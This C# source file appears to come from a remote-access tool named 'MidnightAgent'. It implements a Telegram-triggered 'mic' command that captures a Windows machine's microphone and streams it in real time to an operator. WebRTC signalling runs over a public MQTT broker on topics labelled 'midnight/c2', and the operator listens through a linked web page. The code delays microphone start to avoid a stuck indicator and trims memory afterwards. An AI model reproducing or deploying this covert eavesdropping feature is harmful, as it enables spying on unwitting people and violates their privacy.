using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Core;
using MidnightAgent.Telegram;
using SIPSorcery.Net;
using SIPSorceryMedia.Abstractions;
using MQTTnet;
using MQTTnet.Client;
using MQTTnet.Protocol;
using Newtonsoft.Json;

namespace MidnightAgent.Features
{
    public class MicFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "mic";
        public string Description => "Real-time WebRTC Audio (Optimized for 64kbps)";
        public string Usage => "/mic start | /mic stop";

        private static RTCPeerConnection _pc;
        private static IMqttClient _mqttClient;
        private static string _topicBase;
        private static CustomWaveInAudioSource _audioSource;
        private static SemaphoreSlim _lock = new SemaphoreSlim(1, 1);
        private static bool _isRunning = false;

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0) return FeatureResult.Fail(Usage);
            string action = args[0].ToLower();

            await _lock.WaitAsync();
            try
            {
                if (action == "stop")
                {
                    if (!_isRunning) return FeatureResult.Ok("⚠️ Not running.");
                    await StopStreamingInternal();
                    return FeatureResult.Ok("🛑 Stopped & Memory Released.");
                }
                if (action == "start")
                {
                    if (_isRunning) return FeatureResult.Fail("⚠️ Already running.");
                    return await StartStreamingInternal();
                }
            }
            finally
            {
                _lock.Release();
            }
            return FeatureResult.Fail(Usage);
        }

        private async Task<FeatureResult> StartStreamingInternal()
        {
            try
            {
                _isRunning = true;
                string userId = Config.UserId;
                _topicBase = $"midnight/c2/{userId}";

                var factory = new MqttFactory();
                _mqttClient = factory.CreateMqttClient();
                
                // 🛠️ ปรับจูน MQTT ให้ทนกับเน็ตช้าๆ แกว่งๆ
                var options = new MqttClientOptionsBuilder()
                    .WithTcpServer("broker.hivemq.com", 1883)
                    .WithClientId($"MidnightAgent-{Guid.NewGuid()}")
                    .WithCleanSession(true) 
                    .WithKeepAlivePeriod(TimeSpan.FromSeconds(60)) // ยืดเวลา Keep Alive
                    .WithTimeout(TimeSpan.FromSeconds(15)) // รอ Connection นานขึ้น
                    .Build();

                _mqttClient.ConnectedAsync += async e =>
                {
                    // 🛠️ ตั้ง Subscribe เป็น QoS 1 ฝั่งรับก็จะไม่พลาดข้อความเหมือนกัน
                    var mqttFactory = new MqttFactory();
                    var subscribeOptions = mqttFactory.CreateSubscribeOptionsBuilder()
                        .WithTopicFilter($"{_topicBase}/call", MqttQualityOfServiceLevel.AtLeastOnce)
                        .WithTopicFilter($"{_topicBase}/answer", MqttQualityOfServiceLevel.AtLeastOnce)
                        .WithTopicFilter($"{_topicBase}/ice", MqttQualityOfServiceLevel.AtLeastOnce)
                        .Build();
                    await _mqttClient.SubscribeAsync(subscribeOptions, CancellationToken.None);
                };

                _mqttClient.DisconnectedAsync += async e =>
                {
                    if (_isRunning)
                    {
                        await Task.Delay(TimeSpan.FromSeconds(5));
                        try { await _mqttClient.ConnectAsync(options); } catch { }
                    }
                };

                _mqttClient.ApplicationMessageReceivedAsync += HandleSignalingMessage;
                await _mqttClient.ConnectAsync(options);

                string url = $"https://midnightc2.netlify.app/listener?id={userId}";
                string nick = NickFeature.GetNickname();
                string display = string.IsNullOrEmpty(nick) ? userId : $"{userId} ({nick})";
                
                return FeatureResult.Ok($"🎙️ <b>WebRTC Ready! (64kbps Mode)</b>\nID: <code>{display}</code>\n🎧 <a href=\"{url}\"><b>Common Listen</b></a>");
            }
            catch (Exception ex)
            {
                await StopStreamingInternal();
                return FeatureResult.Fail($"❌ Error: {ex.Message}");
            }
        }

        private async Task HandleSignalingMessage(MqttApplicationMessageReceivedEventArgs e)
        {
            // 1. ดึงข้อมูลออกมาก่อนเข้า Task.Run เพื่อป้องกัน MQTTnet recycle buffer
            string topic = e.ApplicationMessage.Topic;
            string payload = "";
            if (e.ApplicationMessage.PayloadSegment.Array != null)
            {
                payload = Encoding.UTF8.GetString(e.ApplicationMessage.PayloadSegment.Array, e.ApplicationMessage.PayloadSegment.Offset, e.ApplicationMessage.PayloadSegment.Count);
            }

            _ = Task.Run(async () =>
            {
                try
                {
                    if (topic.EndsWith("/call"))
                    {
                        await _lock.WaitAsync();
                        try { await CreatePeerConnection(); }
                        finally { _lock.Release(); }

                        var offer = _pc.createOffer(null);
                        
                        // 2. แทรกจำกัด Bandwidth หลังบรรทัด m=audio อย่างถูกต้องด้วย Regex
                        offer.sdp = offer.sdp.Replace("b=AS:30\r\n", ""); 
                        offer.sdp = System.Text.RegularExpressions.Regex.Replace(offer.sdp, @"(m=audio.*?\r\n)", "$1b=AS:400\r\n");

                        await _pc.setLocalDescription(offer);
                        await SendMqtt($"{_topicBase}/offer", offer.sdp);
                    }
                    else if (topic.EndsWith("/answer"))
                    {
                        if (_pc != null)
                        {
                            _pc.setRemoteDescription(new RTCSessionDescriptionInit { sdp = payload, type = RTCSdpType.answer });
                            
                            // 🛠️ คุยกับหน้าเว็บผ่าน Custom SDP Attribute เพื่อความแม่นยำ 100%
                            bool isHighQuality = payload.Contains("a=x-quality:hd");
                            
                            if (_audioSource != null)
                            {
                                _audioSource.SetHighQualityMode(isHighQuality);
                                Console.WriteLine($"[WebRTC] Answer received. Explicit Quality: {(isHighQuality ? "HD" : "Standard")}");
                                TelegramInstance.SendMessage($"🎙️ <b>Status:</b> {(isHighQuality ? "HD Audio Mode (16kHz)" : "Standard Mode (8kHz)")}");
                            }
                        }
                    }
                    else if (topic.EndsWith("/ice"))
                    {
                        if (_pc != null && !string.IsNullOrEmpty(payload))
                        {
                            var ice = JsonConvert.DeserializeObject<RTCIceCandidateInit>(payload);
                            if (ice != null) _pc.addIceCandidate(ice);
                        }
                    }
                }
                catch (Exception ex)
                {
                    // ปริ้นท์ Error ออกมาดู จะได้รู้ว่าพังตรงไหนเวลาเทส
                    Console.WriteLine($"[WebRTC Error]: {ex.Message}\n{ex.StackTrace}");
                }
            });
        }

        private async Task CreatePeerConnection()
        {
             CleanupPeerConnection();

             if (_audioSource != null)
             {
                 await _audioSource.CloseAudio();
                 _audioSource = null;
             }
             _audioSource = new CustomWaveInAudioSource();

             var config = new RTCConfiguration
             {
                 iceServers = new List<RTCIceServer> 
                 { 
                     // 🛠️ เพิ่ม STUN Server หลายๆ ตัว ช่วยลดอาการเชื่อมต่อไม่ติดจากปัญหา Network NAT
                     new RTCIceServer { urls = "stun:stun.l.google.com:19302" },
                     new RTCIceServer { urls = "stun:stun1.l.google.com:19302" },
                     new RTCIceServer { urls = "stun:stun.cloudflare.com:3478" } 
                 }
             };
             _pc = new RTCPeerConnection(config);

             var pcmuFormat = new AudioFormat(SDPWellKnownMediaFormatsEnum.PCMU);
             var l16Format = new AudioFormat(96, "L16", 16000); 
             
             var formats = new List<SDPAudioVideoMediaFormat> { 
                 new SDPAudioVideoMediaFormat(l16Format),
                 new SDPAudioVideoMediaFormat(pcmuFormat) 
             };
             
             var audioTrack = new MediaStreamTrack(SDPMediaTypesEnum.audio, false, formats);
             _pc.addTrack(audioTrack);

             _audioSource.OnAudioSourceEncodedSample += _pc.SendAudio;
             _audioSource.OnAudioSourceRawSample += (rate, duration, samples) => {
                 if (_pc != null && _audioSource.IsHighQuality) 
                 {
                     // 🛠️ RTP L16 ต้องใช้ Big-Endian (Network Byte Order) 
                     // แต่ Windows ใช้ Little-Endian เลยต้องสลับ Byte ก่อนส่ง
                     byte[] bigEndianBytes = new byte[samples.Length * 2];
                     for (int i = 0; i < samples.Length; i++)
                     {
                         bigEndianBytes[i * 2] = (byte)(samples[i] >> 8);
                         bigEndianBytes[i * 2 + 1] = (byte)(samples[i] & 0xFF);
                     }
                     _pc.SendAudio((uint)bigEndianBytes.Length, bigEndianBytes);
                 }
             };
             // จะไป StartAudio จริงๆ เมื่อ OnConnectionStateChange เป็น connected เท่านั้น เพื่อไม่ให้ขึ้นรูปไมค์ค้าง
             // await _audioSource.StartAudio(); 

             _pc.onicecandidate += OnIceCandidate;
             _pc.onconnectionstatechange += OnConnectionStateChange;
        }

        private void OnIceCandidate(RTCIceCandidate candidate)
        {
             if (candidate != null)
             {
                 var iceJson = JsonConvert.SerializeObject(new { candidate = candidate.candidate, sdpMid = candidate.sdpMid, sdpMLineIndex = candidate.sdpMLineIndex });
                 _ = SendMqtt($"{_topicBase}/ice_agent", iceJson);
             }
        }

        private void OnConnectionStateChange(RTCPeerConnectionState state)
        {
            if (state == RTCPeerConnectionState.connected) {
                TelegramInstance.SendMessage("✅ <b>Connected!</b>");
                _ = Task.Run(async () => {
                    if (_audioSource != null) await _audioSource.StartAudio();
                });
            }

            if (state == RTCPeerConnectionState.disconnected || state == RTCPeerConnectionState.failed || state == RTCPeerConnectionState.closed)
            {
                _ = Task.Run(async () =>
                {
                    await _lock.WaitAsync();
                    try
                    {
                        if (_audioSource != null)
                        {
                            await _audioSource.CloseAudio();
                            _audioSource = null;
                        }
                        CleanupPeerConnection();
                    }
                    catch { }
                    finally
                    {
                        _lock.Release();
                    }
                });
            }
        }

        private void CleanupPeerConnection()
        {
            if (_pc != null)
            {
                _pc.onicecandidate -= OnIceCandidate;
                _pc.onconnectionstatechange -= OnConnectionStateChange;
                
                _pc.Close("stop");
                _pc.Dispose();
                _pc = null;
            }
        }

        private async Task SendMqtt(string topic, string payload)
        {
            if (_mqttClient != null && _mqttClient.IsConnected)
            {
                // 🛠️ เปลี่ยนเป็น AtLeastOnce (QoS 1) ข้อมูลจะไม่หายกลางทางเมื่อเน็ตแกว่ง
                var msg = new MqttApplicationMessageBuilder()
                    .WithTopic(topic)
                    .WithPayload(payload)
                    .WithQualityOfServiceLevel(MqttQualityOfServiceLevel.AtLeastOnce) 
                    .Build();
                await _mqttClient.PublishAsync(msg);
            }
        }

        private async Task StopStreamingInternal()
        {
            _isRunning = false;

            if (_audioSource != null)
            {
                if (_pc != null) _audioSource.OnAudioSourceEncodedSample -= _pc.SendAudio;
                await _audioSource.CloseAudio();
                _audioSource = null;
            }

            CleanupPeerConnection();

            if (_mqttClient != null)
            {
                _mqttClient.ApplicationMessageReceivedAsync -= HandleSignalingMessage;
                await _mqttClient.DisconnectAsync();
                _mqttClient.Dispose();
                _mqttClient = null;
            }
            
            GC.Collect(2, GCCollectionMode.Forced);
            GC.WaitForPendingFinalizers();
            GC.Collect(2, GCCollectionMode.Forced);
            
            try { SetProcessWorkingSetSize(System.Diagnostics.Process.GetCurrentProcess().Handle, -1, -1); } catch { }
        }

        [DllImport("kernel32.dll")]
        static extern bool SetProcessWorkingSetSize(IntPtr hProcess, int dwMinimumWorkingSetSize, int dwMaximumWorkingSetSize);
    }

    public class CustomWaveInAudioSource : IAudioSource
    {
        public event EncodedSampleDelegate OnAudioSourceEncodedSample;
        public event Action<EncodedAudioFrame> OnAudioSourceEncodedFrameReady;
        public event RawAudioSampleDelegate OnAudioSourceRawSample;
        public event SourceErrorDelegate OnAudioSourceError;

        private WaveInRecorder _recorder;
        private double _currentGain = 1.0;
        private const double TargetAmplitude = 18000.0;
        private const double MaxGain = 12.0;

        private int _silenceHangover = 0;
        private const int HangoverLimit = 15;
        public bool IsHighQuality { get; private set; } = false;

        public CustomWaveInAudioSource()
        {
            _recorder = new WaveInRecorder(OnWaveInData);
        }
        
        public void SetHighQualityMode(bool highQuality)
        {
            IsHighQuality = highQuality;
        }

        public Task StartAudio()
        {
            _recorder.Start();
            return Task.CompletedTask;
        }

        public Task CloseAudio()
        {
            _recorder.Stop(); 
            return Task.CompletedTask;
        }

        public Task PauseAudio() => Task.CompletedTask;
        public Task ResumeAudio() => Task.CompletedTask;
        public List<AudioFormat> GetAudioSourceFormats() => new List<AudioFormat> { new AudioFormat(SDPWellKnownMediaFormatsEnum.PCMU) };
        public void SetAudioSourceFormat(AudioFormat audioFormat) { }
        public void RestrictFormats(Func<AudioFormat, bool> filter) { }
        public void ExternalAudioSourceRawSample(AudioSamplingRatesEnum samplingRate, uint durationMilliseconds, short[] sample) { }
        public bool HasEncodedAudioSubscribers() => OnAudioSourceEncodedSample != null;
        public bool IsAudioSourcePaused() => false;

        private void OnWaveInData(byte[] pcmData)
        {
            // 🛠️ Auto-Gain Logic (AGC)
            short[] samples = new short[pcmData.Length / 2];
            int maxAbs = 0;

            for (int i = 0; i < pcmData.Length; i += 2)
            {
                short s = BitConverter.ToInt16(pcmData, i);
                samples[i / 2] = s;
                int abs = Math.Abs((int)s);
                if (abs > maxAbs) maxAbs = abs;
            }

            if (maxAbs > 30) // ป้องกันการขยายเสียงซ่าไฟฟ้า (Noise Floor)
            {
                double targetGain = TargetAmplitude / maxAbs;
                if (targetGain > MaxGain) targetGain = MaxGain;
                if (targetGain < 1.0) targetGain = 1.0;

                // Smoothing: ปลดเนียนๆ ไม่ให้เสียงวูบวาบ
                if (targetGain < _currentGain)
                    _currentGain = _currentGain * 0.6 + targetGain * 0.4; // ลดเร็วเมื่อเจอเสียงดัง
                else
                    _currentGain = _currentGain * 0.98 + targetGain * 0.02; // ค่อยๆ เพิ่มเมื่อเสียงเบา
            }

            if (maxAbs < 20) // ปรับ Threshold ต่ำลงอีกสำหรับเสียงตัว s
            {
                if (_silenceHangover > 0) _silenceHangover--;
                else return;
            }
            else
            {
                _silenceHangover = HangoverLimit;
            }

            // Apply Gain
            for (int i = 0; i < samples.Length; i++)
            {
                double val = samples[i] * _currentGain;
                if (val > 32767) val = 32767;
                else if (val < -32768) val = -32768;
                samples[i] = (short)val;
            }

            if (IsHighQuality)
            {
                // Send Raw L16 (PCM) 16kHz
                OnAudioSourceRawSample?.Invoke((AudioSamplingRatesEnum)16000, 100, samples);
            }
            else
            {
                // Send PCMU: ต้อง Downsample จาก 16kHz เป็น 8kHz (หยิบค่าเว้นค่า)
                byte[] downsampledPcm = new byte[(samples.Length / 2) * 2];
                for (int i = 0; i < samples.Length / 2; i++) {
                    short s = samples[i * 2];
                    downsampledPcm[i * 2] = (byte)(s & 0xFF);
                    downsampledPcm[i * 2 + 1] = (byte)((s >> 8) & 0xFF);
                }
                byte[] encoded = MuLawEncoder.Encode(downsampledPcm);
                OnAudioSourceEncodedSample?.Invoke((uint)encoded.Length, encoded);
            }
        }
    }

    public static class MuLawEncoder
    {
        public static byte[] Encode(byte[] pcmData)
        {
            byte[] encoded = new byte[pcmData.Length / 2];
            int outIndex = 0;
            for (int i = 0; i < pcmData.Length; i += 2)
            {
                encoded[outIndex++] = LinearToMuLaw(BitConverter.ToInt16(pcmData, i));
            }
            return encoded;
        }
        private static byte LinearToMuLaw(short sample)
        {
            const int BIAS = 0x84;
            const int CLIP = 32635;
            int sign = (sample >> 8) & 0x80;
            if (sample < 0) sample = (short)-sample;
            if (sample > CLIP) sample = CLIP;
            sample = (short)(sample + BIAS);
            int exponent = 7;
            for (int expMask = 0x4000; (sample & expMask) == 0 && exponent > 0; exponent--, expMask >>= 1) { }
            int mantissa = (sample >> (exponent + 3)) & 0x0F;
            byte mulaw = (byte)(sign | (exponent << 4) | mantissa);
            return (byte)~mulaw;
        }
    }

    public class WaveInRecorder : IDisposable
    {
        [DllImport("winmm.dll")] private static extern int waveInOpen(out IntPtr hWaveIn, int uDeviceID, ref WAVEFORMATEX lpFormat, WaveDelegate dwCallback, IntPtr dwInstance, int dwFlags);
        [DllImport("winmm.dll")] private static extern int waveInPrepareHeader(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")] private static extern int waveInUnprepareHeader(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")] private static extern int waveInAddBuffer(IntPtr hWaveIn, IntPtr lpWaveHdr, int uSize);
        [DllImport("winmm.dll")] private static extern int waveInStart(IntPtr hWaveIn);
        [DllImport("winmm.dll")] private static extern int waveInStop(IntPtr hWaveIn);
        [DllImport("winmm.dll")] private static extern int waveInReset(IntPtr hWaveIn);
        [DllImport("winmm.dll")] private static extern int waveInClose(IntPtr hWaveIn);

        private delegate void WaveDelegate(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);
        private WaveDelegate _waveDelegate; 

        [StructLayout(LayoutKind.Sequential)] public struct WAVEFORMATEX { public short wFormatTag; public short nChannels; public int nSamplesPerSec; public int nAvgBytesPerSec; public short nBlockAlign; public short wBitsPerSample; public short cbSize; }
        [StructLayout(LayoutKind.Sequential)] public struct WAVEHDR { public IntPtr lpData; public int dwBufferLength; public int dwBytesRecorded; public IntPtr dwUser; public int dwFlags; public int dwLoops; public IntPtr lpNext; public IntPtr reserved; }

        private const int MM_WIM_DATA = 0x3C0;
        private IntPtr _hWaveIn;
        private Action<byte[]> _callback;
        private bool _recording = false;
        private List<IntPtr> _headers = new List<IntPtr>();
        
        // 🛠️ ปรับ Buffer จาก 60ms เป็น 100ms เพื่อความเสถียรและประหยัด Overhead
        // 8kHz 16bit: 1 วินาที = 16000 bytes -> 100ms = 1600 bytes
        private const int BUFFER_SIZE = 1600; 
        private const int NUM_BUFFERS = 5; // เพิ่ม Buffer สำรองช่วยเรื่องเน็ตแกว่ง

        public WaveInRecorder(Action<byte[]> callback)
        {
            _callback = callback;
        }

        public void Start()
        {
            if (_recording) return;

            WAVEFORMATEX fmt = new WAVEFORMATEX();
            fmt.wFormatTag = 1; // PCM
            fmt.nChannels = 1; 
            fmt.nSamplesPerSec = 16000; // อัปเกรดเป็น 16kHz เพื่อให้ได้เสียงตัว s ชัดขึ้น
            fmt.wBitsPerSample = 16;
            fmt.nBlockAlign = (short)(fmt.nChannels * fmt.wBitsPerSample / 8); 
            fmt.nAvgBytesPerSec = fmt.nSamplesPerSec * fmt.nBlockAlign; 
            fmt.cbSize = 0;

            _waveDelegate = new WaveDelegate(WaveInProc);
            int res = waveInOpen(out _hWaveIn, -1, ref fmt, _waveDelegate, IntPtr.Zero, 0x00030000); 
            if (res != 0) return;

            // 100ms ของ 16kHz 16-bit = 16000 * 0.1 * 2 = 3200 bytes
            const int EFFECTIVE_BUFFER_SIZE = 3200;

            for (int i = 0; i < NUM_BUFFERS; i++)
            {
                WAVEHDR hdr = new WAVEHDR();
                hdr.dwBufferLength = EFFECTIVE_BUFFER_SIZE;
                hdr.lpData = Marshal.AllocHGlobal(EFFECTIVE_BUFFER_SIZE);
                
                IntPtr pHdr = Marshal.AllocHGlobal(Marshal.SizeOf(hdr));
                Marshal.StructureToPtr(hdr, pHdr, false);
                
                waveInPrepareHeader(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
                waveInAddBuffer(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
                _headers.Add(pHdr);
            }

            waveInStart(_hWaveIn);
            _recording = true;
        }

        private void WaveInProc(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2)
        {
            if (uMsg == MM_WIM_DATA && _recording)
            {
                try
                {
                    WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(dwParam1, typeof(WAVEHDR));
                    if (hdr.dwBytesRecorded > 0)
                    {
                        byte[] buf = new byte[hdr.dwBytesRecorded];
                        Marshal.Copy(hdr.lpData, buf, 0, hdr.dwBytesRecorded);
                        _callback?.Invoke(buf);
                    }
                    if (_recording)
                    {
                        waveInAddBuffer(hWaveIn, dwParam1, Marshal.SizeOf(hdr));
                    }
                }
                catch { }
            }
        }

        public void Stop()
        {
            if (!_recording) return;
            _recording = false;
            
            try 
            {
                waveInReset(_hWaveIn);
                waveInClose(_hWaveIn);
            } 
            catch { }
            
            Dispose();
        }

        public void Dispose()
        {
            if (_headers == null) return;
            foreach (var pHdr in _headers)
            {
                try
                {
                    WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(pHdr, typeof(WAVEHDR));
                    waveInUnprepareHeader(_hWaveIn, pHdr, Marshal.SizeOf(hdr));
                    
                    if (hdr.lpData != IntPtr.Zero) 
                    {
                        Marshal.FreeHGlobal(hdr.lpData);
                        hdr.lpData = IntPtr.Zero;
                    }
                    Marshal.DestroyStructure(pHdr, typeof(WAVEHDR)); 
                    Marshal.FreeHGlobal(pHdr);
                }
                catch { }
            }
            _headers.Clear();
            _hWaveIn = IntPtr.Zero;
        }
    }
}
